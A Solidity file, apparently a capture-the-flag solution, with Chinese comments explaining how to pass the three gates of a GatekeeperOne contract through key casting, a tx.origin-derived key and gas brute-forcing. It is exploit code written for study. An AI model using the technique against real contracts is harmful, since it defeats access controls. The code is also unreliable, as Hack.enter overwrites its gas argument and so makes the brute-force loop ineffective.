// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Hack {
    function enter(address _target,uint gas) external{

        GatekeeperOne target =GatekeeperOne(_target);
        gas=256;
        /*k=uint64(_gateKey)
    1，uint32(k) == uint16(k);//当我把下面几行代码复制上来之后，并简单的代替删去一些东西
    2，uint32(k) != k;//
    3，uint32(k) == uint16(uint160(tx.origin));//可以看到这个地方的代码要求是最严格的
    所以我先要求满足这个*/
        uint16 k16=uint16(uint160(tx.origin));//但是接下来还要满足上面的两个
        //由于k16为16位，所以第一个也必定成立
        //那么思考一下怎么才能满足第二个呢？
        //要满足2，uint32(k) != k;那么可以讲k最左边再加上一个1，这样变回32位的时候又出现了，所以可以通过
        uint64 k64=uint64(1<<63)+uint64(k16);
        bytes8 Key=bytes8(k64);
        //最后来看第二个问题，gas费能被整除的问题
        //为了去解决这个问题，我选择去另外写了一个合约来调用这个合约
        require(gas<8191,"gas >= 8191");
        require(target.enter{gas:8191*10+gas}(Key),"Falied");//这一行调用目标合约，并且给定给出的gas费用

    }
    
}
contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);//这个在前面可以看到，指的是调用合约的最初者
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    //这行的代码表达的意思是执行这行代码的时候gas的剩余要能被8191整除
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;//为了满足这个修饰器，选择去复制这几行代码并逐一分析
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract test{
  uint public a;
  event GasValue(uint value);
  GatekeeperOne private target;
  Hack private hack;
  constructor(address _target,address _hack) {//没什么好说的，传入合约并引用
    target=GatekeeperOne(_target);
    hack=Hack(_hack);
  }
  function move() public {//这个函数将不断尝试各种gas费的i，尝试找到正确的
    for(uint i=100;i<8191;i++){
      try hack.enter(address (target),i){//这个try就是尝试找到正确的
       emit GasValue(i);
        return;//必要的
      }catch{}//这个一般和try搭配使用，用来吸收try中的报错
    }
  }
}